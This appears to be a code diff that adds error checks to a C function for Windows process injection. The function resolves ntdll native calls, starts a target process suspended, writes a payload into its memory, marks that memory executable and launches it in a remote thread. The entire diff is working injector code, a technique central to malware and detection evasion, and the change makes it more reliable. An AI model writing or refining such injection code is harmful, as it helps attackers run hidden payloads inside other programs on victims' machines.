@@ -39,18 +39,49 @@ void inject_create_remote_thread() {
 	region_size = payload_size;
 
 	hNtdll = GetModuleHandleA("ntdll.dll");
+	if (!hNtdll) {
+		return;
+	}
+
 	NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
 	NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
 	NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
 	NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
 
-	CreateProcessA(NULL, target_process, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
-	NtAllocateVirtualMemory(pi.hProcess, &buf, 0, &region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	NtWriteVirtualMemory(pi.hProcess, buf, payload, payload_size, NULL);
-	NtProtectVirtualMemory(pi.hProcess, &buf, &region_size, PAGE_EXECUTE_READ, &old);
-	NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, pi.hProcess, buf, NULL, FALSE, 0, 0, 0, NULL);
+	if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtProtectVirtualMemory || !NtCreateThreadEx) {
+		return;
+	}
+
+	if (!CreateProcessA(NULL, target_process, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+		return;
+	}
+
+	if (NtAllocateVirtualMemory(pi.hProcess, &buf, 0, &region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0) {
+		TerminateProcess(pi.hProcess, 0);
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		return;
+	}
+
+	if (NtWriteVirtualMemory(pi.hProcess, buf, payload, payload_size, NULL) != 0) {
+		TerminateProcess(pi.hProcess, 0);
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		return;
+	}
+
+	if (NtProtectVirtualMemory(pi.hProcess, &buf, &region_size, PAGE_EXECUTE_READ, &old) != 0) {
+		TerminateProcess(pi.hProcess, 0);
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		return;
+	}
+
+	if (NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, pi.hProcess, buf, NULL, FALSE, 0, 0, 0, NULL) == 0) {
+		CloseHandle(hThread);
+	}
+
 	ResumeThread(pi.hThread);
-	CloseHandle(hThread);
 	CloseHandle(pi.hProcess);
 	CloseHandle(pi.hThread);
 }
